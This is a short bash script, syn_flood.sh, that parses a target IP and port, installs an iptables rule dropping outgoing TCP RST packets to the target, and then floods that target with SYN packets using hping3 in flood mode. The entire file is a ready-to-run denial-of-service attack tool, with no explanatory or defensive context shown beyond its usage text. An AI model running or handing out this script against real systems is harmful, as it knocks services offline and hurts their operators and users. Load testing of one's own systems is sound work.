#!/bin/bash

function print_help ()
{
  echo "Usage: \"syn_flood.sh -d IP -p PORT\""
  echo -e "It is mandatory to include -d and -p option, script should be run with sudo."
  echo -e "-d \t --ip-destination \t\t Ip destination to be attacked by syn flood."
  echo -e "-p \t --port-destination \t\tPort which will be attacked on the remote TCP end point."
  exit
}

ip_destination="";
port="";

while [[ $# -gt 0 ]]; do
  ARG="$1"
  case $ARG in
    "-d"|"--ip-destination")
      ip_destination="$2"
      shift
      shift
      ;;
    "-p"|"--port-destination")
      port="$2"
      shift
      shift
      ;;
    "-h"|"--help")
      print_help
      shift
      ;;
    *)
      echo "Try syn_flood.sh -h or --help"
      exit
      ;;
  esac
done

if [ -z $ip_destination ] || [ -z $port ]; then
  echo "IP destination or port not set, please try syn_flood.sh -h or --help"
  exit 1;
fi

sigprocess()
{
   echo "SIGINT received, cleaning iptables rules and exiting"
   iptables -D OUTPUT -d $ip_destination -p tcp --tcp-flags RST RST -j DROP;
   exit 0
}

# Trap SIGINT
trap 'sigprocess' SIGINT

#BLOCK OUTGOING RST
echo "Blocking any outgoing RST TCP packet"

iptables -I OUTPUT 1 -d $ip_destination -p tcp --tcp-flags RST RST -j DROP

echo "Attacking remote $ip_destination and port $port"

hping3 -M 0 -S "$ip_destination" -p "$port" --flood > /var/log/hping3.log 2>&1
